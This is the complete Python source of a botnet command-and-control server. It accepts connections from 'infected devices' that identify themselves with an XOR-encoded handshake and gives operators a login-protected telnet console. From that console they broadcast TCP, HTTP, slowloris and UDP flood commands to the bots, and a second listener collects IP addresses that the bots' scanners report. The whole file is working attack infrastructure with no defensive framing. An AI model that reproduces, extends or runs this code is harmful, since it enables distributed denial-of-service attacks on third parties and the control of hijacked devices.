#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
#arm
import socket
import threading
import os
import time
import sys
import base64 as b64
import random
shutdown= False
count = 0
dead = 0
socketList = []
key= "asdfghjkloiuytresxcvbnmliuytf"#xor key

def ReadSocket(sock,length):
	data = ""
	while data == "":
		data += sock.recv(length).decode(errors='ignore').strip()#quick fix
	return data

def ReadLine(sock,length):
	data = ""
	while data[-4:] == "\r\n":
		data += sock.recv(length).decode()
	return data

def SentCmd(data,sock,rlock):
	global socketList
	global count
	global dead
	rlock.acquire()
	try:
		sock.settimeout(1)
		sock.send(data.encode())
		count += 1
	except:
		sock.close()
		socketList.remove(sock)#del error connection
		dead += 1
	rlock.release()

def SendCmd(cmd,so,rlock):#Send Commands Module
	global count
	global dead
	print('[!] Command sent!')#debug
	print(cmd)
	data = xor_enc(cmd,key)#encode
	count = 0
	dead = 0
	th_list = []
	for sock in socketList:
		th = threading.Thread(target=SentCmd,args=(data,sock,rlock,))
		th.start()
		th_list.append(th)
	for th in th_list:
		th.join()
	print("[!] "+str(dead)+" bots offline.")
	print(str(count)+" bots got the command.")
	so.send(("Attack sent to "+str(count)+" devices.\r\n").encode())
	scan_device(rlock)#double check the bot connection status

def scan_device(rlock):#scan online device
	print('Searching for devices...')
	dead = 0
	for sock in socketList:
		try:
			sock.settimeout(1)
			sock.send(xor_enc("ping",key).encode())#check connection
			#print("ping")
			sock.settimeout(2)
			try:
				pong = sock.recv(1024).decode()
				if xor_dec(pong,key) == "pong":
					#print("pong")
					pass
				else:
					sock.close()
					rlock.acquire()
					socketList.remove(sock)
					rlock.release()
					dead+= 1
				print("[!] "+str(dead)+" bots offline.")
			except:
				print("[!] A bot died")
		except:
			rlock.acquire()
			socketList.remove(sock)#del error connection
			rlock.release()
			print("[!] A bot is offline")#debug

def ShowBot(so):#bot count
	while True:
		try:
			so.send(("\033]0;Infected Devices: "+str(len(socketList))+" \007").encode())
			time.sleep(1)
		except:
			return

def handle_bot(sock,socketList,rlock):
	#code = len(socketList) + 1
	while True:
		try:
			sock.settimeout(1)
			sock.send(xor_enc("ping",key).encode())#keepalive and check connection
			#print("ping")
			sock.settimeout(2)
			pong = sock.recv(1024).decode()
			if xor_dec(pong,key) == "pong":
				#print("pong")
				time.sleep(15)#check connection every 15 seconds
			else:
				try:
					sock.close()
					rlock.acquire()
					socketList.remove(sock)
					rlock.release()
					print("[!] A bot offline")
					break
				except:
					break
		except:
			try:#must try here because the bot may removed from other function
				sock.close()
				rlock.acquire()
				socketList.remove(sock)
				rlock.release()
				print("[!] A bot offline")
			except:#bug happened here, if not add "break" then there will be a "magic" loop
				pass
			break

def Verify(sock,addr,rlock):
	try:
		data = ReadSocket(sock,1024)#support telnet
		print(data)
		if data == "UEBXUQ==" :#1337 after encode
			if sock not in socketList:
				rlock.acquire()
				socketList.append(sock)
				rlock.release()
				print("[!] A bot is online: "+ str(addr)) #message
				handle_bot(sock,socketList,rlock)
		else:
			print("Somebody connected:"+str(addr))
			Commander(sock,rlock)
	except:
		sock.close()

def Commander(sock,rlock):#cnc server
	try:
		captcha = random.randint(9000,15000)
		captcha1 = "Solve the captcha (" + str(captcha) + "): "
		sock.send(str(captcha1).encode())
		capanswer = ReadSocket(sock,1024)
	
		sock.send("Welcome to the login screen.\r\n".encode())
		sock.send("[38;2;255;115;250mUsername: ".encode())
		name = ReadSocket(sock,1024)
		sock.send("Password: ".encode())
		passwd = ReadSocket(sock,1024)
	except:
		print("// Someone try to break the server down in progress //")
		return
	tmp = open("login.txt").readlines()#enter ur username and password in login.txt
	corret=0
	for x in tmp:
		tmp2 = x.split()
		#print(tmp2[0])#debug
		#print(tmp2[1])#
		if tmp2[0] == name and tmp2[1] == passwd:
			print("User Connected: "+tmp2[0])
			corret=1
	if corret != 1:
		sock.close()
		return
	sock.send("\033[36;0mLoading your session\r\n".encode())#loading sense
	time.sleep(0.5)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Loading your session [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("[!] Setting Up Connection Socket...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Updating Server Config...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Enabling logs...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Done...\r\n".encode())
	time.sleep(0.5)
	sock.send(("[!] Welcome, "+str(name.strip("\r\n"))+"\r\n").encode())
	time.sleep(1)
	sock.send("\r\n".encode())
	threading.Thread(target=ShowBot,args=(sock,),daemon=True).start()


	while True:
		#print ("==> Python3 C&C server <==")
		sock.send((str(name)+'@Botnet:').encode())#if u run this on windows, it may has some bug, idk why.
		cmd_str = ReadSocket(sock,1024).lower()
		if len(cmd_str):
			if cmd_str[0] == '!':
				SendCmd(cmd_str,sock,rlock)
				#sock.send(str(count)+"bots exec the command\r\n".encode())
			if cmd_str == 'scan':
				scan_device(rlock,)
			#if cmd_str == 'shell' or cmd_str == 'shell\r\n': haven't finished
				#shell_exec()
			if cmd_str == 'methods' or cmd_str == 'METHODS':
				sock.send('!cc host port threads\r\n'.encode()) #tcp connection flood
				sock.send('!http host port threads path\r\n'.encode()) #http flood
				sock.send('!slow host port threads conn path\r\n'.encode()) #slowloris
				sock.send('!udp host port threads size\r\n\r\n'.encode()) #udp flood
			if cmd_str == '?' or cmd_str == 'help':
				sock.send('!stop: stops all attacks\r\n'.encode())
				sock.send('methods: shows methods\r\n'.encode())
				#sock.send('!kill: kill all the bots\r\n'.encode())
				#sock.send('  !scan: enable/disable scanner\r\n'.encode())
				sock.send('bots: bot count\r\n'.encode())
				#ssock.send('  scan: check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
				sock.send('clear: clear screen\r\n'.encode())
				sock.send('exit: exit the server\r\n'.encode())
				#sock.send('shutdown: shutdown the server\r\n'.encode())
			if cmd_str == 'bots':
				sock.send(("Devices: "+str(len(socketList))+"\r\n").encode())
			if cmd_str == 'clear':
				sock.send("\033[2J\033[1H".encode())
				sock.send('Test Python Botnet\r\n'.encode())
			if cmd_str == 'exit':
				sock.send(('Bye, '+str(name.strip("\r\n"))+'\033[0m\r\n').encode())
				sock.close()
				break
			if cmd_str == 'shutdown':
				sock.send('Shutdown\r\n'.encode())
				sock.close()
				print("Remote Shutdown Activated.")
				global shutdown
				shutdown = True
				sys.exit()

def listen_scan():
	lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	lis.bind(('0.0.0.0',911))
	lis.listen(1024)
	while 1:
		s, _ = lis.accept()
		tmp = s.recv(1024).decode()
		#print("Recevied something "+str(tmp))
		try:
			data = xor_dec(tmp,key)
			print("IP: "+data)
			with open("scanned.txt","a") as fd:
				fd.write(data+"\r\n")
				fd.close()
		except:
			pass


def main(rlock):
	threading.Thread(target=listen_scan,daemon=True).start()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
	s.bind(('0.0.0.0',b))
	s.listen(1024)
	while 1:
		sock, addr = s.accept()
		threading.Thread(target=Verify,args=(sock,addr,rlock,),daemon=True).start()

def xor_enc(string,key):
	lkey=len(key)
	secret=[]
	num=0
	for each in string:
		if num>=lkey:
			num=num%lkey
		secret.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):
	leter = b64.b64decode( string.encode() ).decode()
	lkey=len(key)
	string=[]
	num=0
	for each in leter:
		if num>=lkey:
			num=num%lkey

		string.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return "".join( string )

if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("Usage: python3 cnc.py <port>")
		sys.exit()
	try:
		b = int(sys.argv[1])
	except:
		print("Port should be an integer.")
		sys.exit()
	rlock = threading.Lock()
	threading.Thread(target=main,args=(rlock,),daemon=True).start()
	while 1:
		try:
			time.sleep(0.1)
			if shutdown:
				sys.exit()
		except KeyboardInterrupt:
			break
		
